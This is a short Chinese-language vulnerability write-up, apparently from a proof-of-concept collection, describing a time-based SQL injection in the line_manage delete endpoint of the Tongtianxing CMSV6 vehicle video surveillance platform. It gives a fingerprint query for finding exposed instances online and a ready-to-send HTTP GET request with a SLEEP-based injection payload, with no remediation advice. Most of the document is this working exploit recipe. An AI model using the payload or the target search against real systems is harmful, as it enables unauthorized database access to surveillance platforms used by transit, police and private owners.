# 通天星CMSV6车载视频监控平台 line_manage存在SQL注入漏洞

# 一、漏洞简介
通天星CMSV6车载视频监控平台是东莞市通天星软件科技有限公司研发的监控平台，通天星CMSV6产品覆盖车载录像机、单兵录像机、网络监控摄像机、行驶记录仪等产品的视频综合平台。通天星科技应用于公交车车载、校车车载、大巴车车载、物流车载、油品运输车载、警车车载等公共交通视频监控，还应用在家居看护、商铺远程监控、私家车的行驶分享仪上等。通天星CMSV6车载视频监控平台line_manage存在SQL注入漏洞，攻击者可以通过构造恶意的SQL语句，成功注入并执行恶意数据库操作，可能导致敏感信息泄露、数据库被篡改或其他严重后果。

# 二、影响版本
+ 通天星CMSV6车载视频监控平台

# 三、资产测绘
+ hunter`web.body="./open/webApi.html"`
+ 特征

![1699407412929-42aaba13-ce63-4d08-95e9-ce71fcab3ab4.png](./img/F4enrv2hHyz0sLln/1699407412929-42aaba13-ce63-4d08-95e9-ce71fcab3ab4-130124.png)

# 四、漏洞复现
```rust
GET /line_manage/delete;downloadLogger.action?ids=1+AND+%28SELECT+4476+FROM+%28SELECT%28SLEEP%285%29%29%29ytWS%29 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Connection: close
X-Forwarded-For: 127.0.0.1
Accept-Encoding: gzip, deflate
```

![1717262506770-17a548a5-f207-4114-9195-5660ad1b8153.png](./img/F4enrv2hHyz0sLln/1717262506770-17a548a5-f207-4114-9195-5660ad1b8153-218646.png)

```rust
GET /line_manage/delete;downloadLogger.action?ids=1 HTTP/1.1
Host: 192.168.31.228
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Connection: close
X-Forwarded-For: 127.0.0.1
Accept-Encoding: gzip, deflate
```

![1717262527580-86540e20-0078-4842-abdf-59e984bacf4f.png](./img/F4enrv2hHyz0sLln/1717262527580-86540e20-0078-4842-abdf-59e984bacf4f-620776.png)



> 更新: 2024-12-28 13:05:34  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/nwh3iqsrt23310w9>